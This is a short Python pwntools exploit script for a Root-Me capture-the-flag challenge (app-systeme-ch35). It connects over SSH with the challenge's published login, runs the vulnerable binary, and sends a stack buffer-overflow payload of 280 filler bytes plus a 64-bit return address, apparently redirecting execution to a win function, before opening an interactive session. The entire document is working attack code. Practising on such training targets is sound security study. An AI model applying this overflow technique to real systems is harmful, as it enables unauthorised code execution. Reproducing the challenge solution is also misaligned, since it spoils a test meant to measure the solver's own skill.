from pwn import *

host = "challenge03.root-me.org"
port =2223
username = "app-systeme-ch35"
password = "app-systeme-ch35"


ssh_con = ssh(user=username,host=host,port=port,password=password)

try :
    p = ssh_con.process('./ch35')
except Exception as e :
    print(f'Failed to connect {e}')

payload = b'A' * 280 + p64(0x4005e7)

print(payload)
p.sendline(payload)

p.interactive()
